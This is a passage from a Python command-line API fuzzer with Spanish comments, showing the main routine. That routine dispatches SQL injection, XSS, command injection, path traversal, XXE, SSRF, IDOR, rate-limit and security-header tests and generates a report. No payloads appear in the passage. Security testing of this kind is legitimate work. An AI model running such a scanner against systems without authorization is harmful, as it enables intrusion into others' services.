    # Parsear headers adicionales
    additional_headers = {}
    if args.headers:
        for header in args.headers.split(','):
            if ':' in header:
                key, value = header.split(':', 1)
                additional_headers[key.strip()] = value.strip()
    
    # Parsear rango de IDs para IDOR
    id_start, id_end = map(int, args.id_range.split('-'))
    id_range = range(id_start, id_end + 1)
    
    # Mapeo de tipos de test
    test_type_map = {
        'sql': VulnerabilityType.SQL_INJECTION,
        'xss': VulnerabilityType.XSS,
        'cmd': VulnerabilityType.COMMAND_INJECTION,
        'path': VulnerabilityType.PATH_TRAVERSAL,
        'xxe': VulnerabilityType.XXE,
        'ssrf': VulnerabilityType.SSRF,
    }
    
    # Crear fuzzer
    fuzzer = APIFuzzer(
        base_url=args.url,
        headers=additional_headers if additional_headers else None,
        timeout=args.timeout,
        threads=args.threads,
        verbose=args.verbose,
        verify_ssl=not args.no_ssl_verify,
        proxy=args.proxy,
        delay=args.delay
    )
    
    # Banner
    fuzzer.print_banner()
    
    # Información de la auditoría
    fuzzer.log(f"Target: {args.url}", "INFO")
    fuzzer.log(f"Endpoint: {args.endpoint}", "INFO")
    fuzzer.log(f"Tipo de test: {args.type}", "INFO")
    fuzzer.log(f"SSL Verification: {'Disabled' if args.no_ssl_verify else 'Enabled'}", "INFO")
    
    if args.proxy:
        fuzzer.log(f"Usando proxy: {args.proxy}", "INFO")
    
    fuzzer.log("Iniciando fuzzing...\n", "INFO")
    
    # Ejecutar tests 
    try:
        if args.type == 'all':
            # Test completo
            for vuln_type in test_type_map.values():
                fuzzer.fuzz_endpoint(args.endpoint, args.method, args.param, vuln_type)
            
            fuzzer.test_security_headers(args.endpoint)
            fuzzer.test_rate_limiting(args.endpoint, args.requests)
            fuzzer.test_idor(args.endpoint, id_range)
            
        elif args.type == 'headers':
            fuzzer.test_security_headers(args.endpoint)
            
        elif args.type == 'rate':
            fuzzer.test_rate_limiting(args.endpoint, args.requests)
            
        elif args.type == 'idor':
            fuzzer.test_idor(args.endpoint, id_range)
            
        else:
            # Test específico
            vuln_type = test_type_map[args.type]
            fuzzer.fuzz_endpoint(args.endpoint, args.method, args.param, vuln_type)
        
        # Generar reporte
        fuzzer.log("\nFuzzing completado!", "SUCCESS")
        fuzzer.generate_report(args.output, args.json)
        
    except KeyboardInterrupt:
        fuzzer.log("\n\nFuzzing interrumpido por el usuario", "WARNING")
        fuzzer.generate_report(args.output, args.json)
        sys.exit(0)
    except Exception as e:
        fuzzer.log(f"Error inesperado: {str(e)}", "ERROR")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
